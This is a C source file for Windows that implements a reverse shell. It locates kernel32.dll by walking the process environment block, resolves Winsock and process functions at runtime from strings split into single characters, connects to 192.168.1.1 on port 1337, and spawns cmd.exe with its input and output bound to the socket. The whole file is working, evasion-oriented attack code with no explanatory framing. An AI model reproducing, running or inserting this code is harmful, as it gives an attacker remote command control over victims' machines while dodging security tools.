#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <string.h>
#include "peb_structs.h"


// 
// Macro to convert a character to lowercase
//
#define TO_LOWER(c) ( (c >= 'A' && c <= 'Z') ? (c + 'a' - 'A') : c )
#define MAKEWORD_MACRO(a, b) ((WORD)(((BYTE)((a) & 0xff)) | ((WORD)((BYTE)((b) & 0xff))) << 8))



//
// Function prototypes for module lookup and function lookup
// 
inline LPVOID get_module_by_name( wchar_t* module_name );
inline LPVOID get_func_by_name( LPVOID module, char* function_name );

int main( void )
{
    wchar_t kernel32dll[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', '\0' };
    LPVOID kernel32dll_base = get_module_by_name( kernel32dll );

    if( NULL == kernel32dll_base )
    {
        // printf( "[!] Could not find kernel32.dll!\n" );
        return 1;
    }

    // printf( "[+] Successfully found kernel32.dll!\n" );



    // 
    // Get GetProcAddress
    // 
    char get_proc_addr[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0' }; 

    LPVOID getprocaddress_addr = get_func_by_name( kernel32dll_base, get_proc_addr );
    if( NULL == getprocaddress_addr )
    {
        // printf( "[!] Could not find function! Exiting!\n" );
        return 1;
    }
    // printf( "[+] Found GetProcAddress!\n" );



    // 
    // Get LoadLibraryA
    //    
    char load_library[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0' };    
    LPVOID loadlibrarya_addr = get_func_by_name( kernel32dll_base, load_library );
    if( loadlibrarya_addr == NULL )
    {
        // printf( "[!] Could not find function! Exiting!\n" );
        return 1;
    }
    // printf( "[+] Found LoadLibraryA!\n" );



    //
    // Dynamically resolve LoadLibraryA/GetProcAddress
    //
    HMODULE( WINAPI * _LoadLibraryA )( LPCSTR lpLibFileName )                = ( HMODULE(WINAPI*)(LPCSTR))loadlibrarya_addr;
    FARPROC( WINAPI * _GetProcAddress)( HMODULE hModule, LPCSTR lpProcName ) = ( FARPROC (WINAPI*)(HMODULE, LPCSTR))getprocaddress_addr;

    if( NULL == _LoadLibraryA && NULL == _GetProcAddress)
    {
        // printf( "[!] LoadLibraryA or GetProcAddress could not be resolved!\n" );
        return 1;
    }



    //
    // Initialize structs and variables needed to make a connection
    // 
    WSADATA wsaData;
    SOCKET wSock;
    struct sockaddr_in hax;
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;

    char host[] = { '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '1', '\0' };
    short port = 1337;



    //
    // Get address of ws2_32.dll
    //
    char ws2_32dll[] = { 'w', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', '\0' }; 
    LPVOID ws2_32dll_base = _LoadLibraryA( ws2_32dll );

    if( NULL == ws2_32dll_base )
    {
        // printf( "[+] Could not find ws2_32.dll!\n" );
        return 1;
    }



    //
    // 1. INITIALIZE SOCKET LIBRARY USING WSAStartup()
    // Dynamically resolve WSAStartUp WinAPI
    // 
    char wsastartup[] = { 'W', 'S', 'A', 'S', 't', 'a', 'r', 't', 'u', 'p', '\0' };

    int( WINAPI * _WSAStartup)
    (
        WORD      wVersionRequired,
        LPWSADATA lpWSAData
    );

    _WSAStartup = ( int(WINAPI *)
    (
        WORD      wVersionRequired,
        LPWSADATA lpWSAData
    )) _GetProcAddress( (HMODULE)ws2_32dll_base, wsastartup );

    if( NULL == _WSAStartup )
    {
        // printf( "[+] Could not dynamically resolve _WSAStartup!\n" );
        return 1;
    }

    _WSAStartup(MAKEWORD_MACRO(2, 2), &wsaData);



    //
    // 2. CREATE A SOCKET USING WSASocketA()
    // Dynamically resolve WSASocketA() WinAPI
    // 
    char wsasocketa[] = { 'W', 'S', 'A', 'S', 'o', 'c', 'k', 'e', 't', 'A', '\0' };
    
    SOCKET( WINAPI * _WSASocketA)
    (
        int af,
        int type,
        int protocol,
        LPWSAPROTOCOL_INFO lpProtocolInfo,
        GROUP g,
        DWORD dwFlags
    );

    _WSASocketA = ( SOCKET(WINAPI *)
    (
        int af,
        int type,
        int protocol,
        LPWSAPROTOCOL_INFO lpProtocolInfo,
        GROUP g,
        DWORD dwFlags
    )) _GetProcAddress( (HMODULE)ws2_32dll_base, wsasocketa );

    if( NULL == _WSASocketA )
    {
        // printf( "[+] Could not dynamically resolve _WSASocketA!\n" );
        return 1;
    }

    wSock = _WSASocketA( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );

    //
    // Dynamicaly resolve htons() function
    //
    char htons_string[] = { 'h', 't', 'o', 'n', 's', '\0' };

    u_short( WINAPI * _htons)
    (
        u_short hostshort
    );

    _htons = ( u_short(WINAPI *)
    (
        u_short hostshort
    )) _GetProcAddress( (HMODULE)ws2_32dll_base, htons_string );

    if( NULL == _htons )
    {
        // printf( "[+] Could not dynamically resolve _htons!\n" );
        return 1;
    }

    hax.sin_family = AF_INET;
    hax.sin_port = _htons(port);

    //
    // Dynamically resolve inet_addr() function
    //
    char inet_addr_string[] = { 'i', 'n', 'e', 't', '_', 'a', 'd', 'd', 'r', '\0' };

    unsigned long( WINAPI * _inet_addr)
    (
        const char *cp
    );

    _inet_addr = ( unsigned long(WINAPI *)
    (
        const char *cp
    )) _GetProcAddress( (HMODULE)ws2_32dll_base, inet_addr_string );

    if( NULL == _inet_addr )
    {
        // printf( "[+] Could not dynically resolve inet_addr!\n" );
        return 1;
    }    

    hax.sin_addr.s_addr = _inet_addr( host );



    //
    // 3. CONNECT TO A REMOTE HOST
    // Dynamically resolve WSAConnect() WinAPI
    //
    char wsaconnect_string[] = { 'W', 'S', 'A', 'C', 'o', 'n', 'n', 'e', 'c', 't', '\0' };

    int ( WINAPI * _WSAConnect)
    (
        SOCKET         s,
        const SOCKADDR *name,
        int            namelen,
        LPWSABUF       lpCallerData,
        LPWSABUF       lpCalleeData,
        LPQOS          lpSQOS,
        LPQOS          lpGQOS
    );

    _WSAConnect = ( int(WINAPI *)
    (
        SOCKET         s,
        const SOCKADDR *name,
        int            namelen,
        LPWSABUF       lpCallerData,
        LPWSABUF       lpCalleeData,
        LPQOS          lpSQOS,
        LPQOS          lpGQOS
    )) _GetProcAddress( (HMODULE)ws2_32dll_base, wsaconnect_string );

    if( NULL == _WSAConnect )
    {
        // printf( "[+] Could not dynamically resolve WSAConnect!\n" );
        return 1;
    }

    _WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    //
    // Dynamically Resolve memset()
    //
    char msvcrtdll[] = { 'm', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', '\0' };
    LPVOID msvcrtdll_base = _LoadLibraryA( msvcrtdll );

    if( NULL == msvcrtdll_base )
    {
        // printf( "[!] Could not find msvcrt.dll!\n" );
        return 1;
    }

    void * (WINAPI * _memset)
    (
        void *dest,
        int c,
        size_t count
    );

    char memset_str[] = { 'm', 'e', 'm', 's', 'e', 't', '\0' }; 
    _memset = ( void *(WINAPI*)
    (
        void *dest,
        int c,
        size_t count
    )) _GetProcAddress( (HMODULE)msvcrtdll_base, memset_str );

    if( NULL == _memset)
    {
        // printf( "[!] Could not resolve memset()\n" );
        return 1;
    }

    _memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock;


    
    //
    // 4. START cmd.exe WITH REDIRECTED STREAMS TO SOCKET
    // Dynamically resolve CreateProcessA() WinAPI
    // 
    char createprocessa[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', '\0' }; 
    BOOL ( WINAPI * _CreateProcessA )
    (
        LPCSTR                lpApplicationName,
        LPSTR                 lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL                  bInheritHandles,
        DWORD                 dwCreationFlags,
        LPVOID                lpEnvironment,
        LPCSTR                lpCurrentDirectory,
        LPSTARTUPINFOA        lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
    );

    _CreateProcessA = ( BOOL(WINAPI *)
    (
        LPCSTR                lpApplicationName,
        LPSTR                 lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL                  bInheritHandles,
        DWORD                 dwCreationFlags,
        LPVOID                lpEnvironment,
        LPCSTR                lpCurrentDirectory,
        LPSTARTUPINFOA        lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
    )) _GetProcAddress( (HMODULE)kernel32dll_base, createprocessa );

    if( NULL == _CreateProcessA )
    {
        // printf( "[!] Could not dynamically resolve CreateProcess()!\n" );
        return 1;
    }

    char process[] = { 'c', 'm', 'd', '.', 'e', 'x', 'e', '\0' }; 
    _CreateProcessA(NULL, process, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);



    //
    // 5. WAIT FOR PROCESS TO EXIT (excluding for now, might not need - retest for future)
    // WaitForSingleObject(pi.hProcess, INFINITE);



    // 
    // 6. CLEAN UP
    // Dynamically resolve CloseHandle() function
    //
    char closehandle_string[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0' };
    BOOL ( WINAPI * _CloseHandle )
    (
        HANDLE hObject
    );

    _CloseHandle = ( BOOL(WINAPI *)
    (
        HANDLE hObject
    )) _GetProcAddress( (HMODULE)kernel32dll_base, closehandle_string );

    if( NULL == _CloseHandle)
    {
        // printf( "[+] Could not dynamically resolve CloseHandle!\n" );
        return 1;
    }

    _CloseHandle(pi.hProcess);
    _CloseHandle(pi.hThread);
    
    //
    // Dynamically resolve closesocket() function
    //
    char closesocket_string[] = { 'c', 'l', 'o', 's', 'e', 's', 'o', 'c', 'k', 'e', 't', '\0' };
    int ( WINAPI * _closesocket )
    (
        SOCKET s
    );

    _closesocket = ( int(WINAPI * )
    (
        SOCKET s
    )) _GetProcAddress( (HMODULE)ws2_32dll_base, closesocket_string );

    if( NULL == _closesocket )
    {
        // printf( "[+] Could not dynamically resolve closesocket()!\n" );
        return 1;
    }

    _closesocket( wSock );

    //
    // Dynamically resolve WSACleanup function
    // 
    char wsacleanup_string[] = { 'W', 'S', 'A', 'C', 'l', 'e', 'a', 'n', 'u', 'p', '\0' };
    int ( WINAPI * _WSACleanup )();
    
    _WSACleanup = ( int(WINAPI *)()) _GetProcAddress( (HMODULE)ws2_32dll_base, wsacleanup_string );
    
    if( NULL == _WSACleanup )
    {
        // printf( "[+] Could not dynamically resolve WSACleanup\n" );
        return 1;
    }
    
    _WSACleanup();

    // printf( "[+] Exiting with status 0!\n" );
    return 0;
}

//
// This function gets the base address of the module being searched
// 
inline LPVOID get_module_by_name( wchar_t* module_name )
{
    // w// printf( L"[*] Finding address of module: %ls\n", module_name );
    //
    // Access the PEB from GS register offset x60
    // 
    PPEB peb = NULL;
    peb = ( PPEB )__readgsqword( 0x60 ); 

    //
    // Get the Ldr to find the module list
    // 
    // printf( "[*] Found address of peb->Ldr: %p\n", peb->Ldr );
    PPEB_LDR_DATA ldr = peb->Ldr;
    LIST_ENTRY module_list = ldr->InLoadOrderModuleList;

    PLDR_DATA_TABLE_ENTRY front_link = *( (PLDR_DATA_TABLE_ENTRY*)(&module_list) );
    PLDR_DATA_TABLE_ENTRY current_link = front_link;
    
    LPVOID return_module = NULL;

    // 
    // Go through the doubly linked list
    // 
    wchar_t current_module[1032];

    while( current_link != NULL && current_link->DllBase != NULL ) 
    {   
        USHORT buffer_len = current_link->BaseDllName.Length / sizeof( WCHAR );
        USHORT i = 0;

        //
        // Reset the current_module string
        //
        for( i = 0; i < 1032; i++ )
        {
            current_module[i] = '\0';
        }
        
        // printf( "[*] Found BaseDllName: " );
        
        for( i = 0; i < buffer_len; i++ )
        {
            current_module[i] = TO_LOWER( current_link->BaseDllName.Buffer[i] );
        }

        // wprintf( L"current_module: %ls\n", current_module );
         
        for( i = 0; i < buffer_len && module_name[i] != '\0'; i++ )
        {
            if( TO_LOWER( current_link->BaseDllName.Buffer[i] ) != module_name[i] )
            {
                break;
            }

            //
            // If i == buffer_len - 1 and hasn't broken out of the loop - it's the module we're looking for!
            // 
            if( i == buffer_len - 1 )
            {
                // printf("[*] Found a matching module name!\n");
                return_module = current_link->DllBase;
                return return_module;
            }
        }

        //
        // Check to make sure the next does not equal NULL
        // Might be redundant with while loop condition...
        //
        if( (PLDR_DATA_TABLE_ENTRY)current_link->InLoadOrderLinks.Flink == NULL )
        {
            break;
        }
        
        //
        // Go to next item on the linked list
        // 
        current_link = ( PLDR_DATA_TABLE_ENTRY )current_link->InLoadOrderLinks.Flink;
    }

    // printf( "[+] Error?\n" );
    return return_module;
}

//
// This function gets the function address from the module
// 
inline LPVOID get_func_by_name( LPVOID module, char* function_name )
{
    LPVOID return_address = NULL;
    
    // printf( "[*] Getting address of function: %s\n", function_name );

    // 
    // Check if magic bytes are correct ("MZ")
    // 
    IMAGE_DOS_HEADER* dos_header = ( IMAGE_DOS_HEADER* )module;
    if( dos_header->e_magic != IMAGE_DOS_SIGNATURE)
    {
        return NULL;
    }

    // printf( "[*] Magic bytes are \"MZ\"\n" );

    //
    // Get address of the PE Header (e_lfanew)
    // PE Header contains data directories, which are pointers to important data in the executable, such as the import and export tables
    //
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)module + dos_header->e_lfanew);

    // 
    // Get the exports directory - contains functions exported by the module
    // The export directory is in the 0th index of the DataDirectory
    // 
    IMAGE_DATA_DIRECTORY* exports_directory = &(nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    if (exports_directory->VirtualAddress == NULL) 
    {
        return NULL;
    }

    // printf( "[*] Found the exports directory\n" );

    //
    // Get the relative virtual address of the export table
    //
    DWORD export_table_rva = exports_directory->VirtualAddress;

    //
    // Calculate the absolute address of the export directory by adding the VirtualAddress to the base address of the module
    //
    IMAGE_EXPORT_DIRECTORY* export_table_aa = ( IMAGE_EXPORT_DIRECTORY* )( export_table_rva + (ULONG_PTR)module );
    SIZE_T namesCount = export_table_aa->NumberOfNames;

    //
    // Retrieves the number of function names
    // Also gets RVAs of lists of function addresses, function names, and name ordinals
    // 
    DWORD function_list_rva = export_table_aa->AddressOfFunctions;
    DWORD function_names_rva = export_table_aa->AddressOfNames;
    DWORD ordinal_names_rva = export_table_aa->AddressOfNameOrdinals;

    //
    // Loop through names of functions exported by module
    // Attempts to find function whose name matches the func_name parameter
    // 
    for( SIZE_T i = 0; i < namesCount; i++ )
    {
        //
        // Calculate the virtual address of the FUNCTION NAME at the i-th position in the exported names table
        //
        DWORD* name_va  = ( DWORD* )( function_names_rva + (BYTE*)module + i * sizeof(DWORD));
        
        //
        // Calculate the virtual address of the ORDINAL NUMBER of the function name at the i-th position in the exported names table
        //
        WORD* index = ( WORD* )( ordinal_names_rva + (BYTE*)module + i * sizeof(WORD));
        
        //
        // Calculate the virtual address of the FUNCTION'S ADDRESS corresponding to the i-th function name in the exported names table
        //
        DWORD* function_address_va = ( DWORD* )( function_list_rva + (BYTE*)module + (*index) * sizeof(DWORD) );

        //
        // Calculate the function name's (name_va) absolute address
        //
        LPSTR current_name = ( LPSTR )( *name_va + (BYTE*)module);
        
        //
        // Compare the characters and return if function is the module found
        //
        size_t j = 0;
        /*
        // printf( "[*] Found function: " );
        
        for( j = 0; function_name[j] != '\0' && current_name[j] != 0; j++ )
        {
            // printf( "%c", current_name[j] );
        }
        // printf( "\n" );
        */ 
        //
        // Compare the target function name to current function name
        // 
        for( j = 0; function_name[j] != '\0' && current_name[j] != 0; j++ )
        {
            if( TO_LOWER(function_name[j]) != TO_LOWER(current_name[j]) )
            {
                break;
            }

            //
            // If j = the length of both and we haven't broken out of loop, we have a matching function!
            // Return the absoluste address of the function
            //
            if( function_name[j + 1] == '\0' && current_name[j + 1] == 0 )
            {
                return_address = (BYTE*)module + (*function_address_va);
                return return_address;
            }
        }
    }

    return return_address;
}
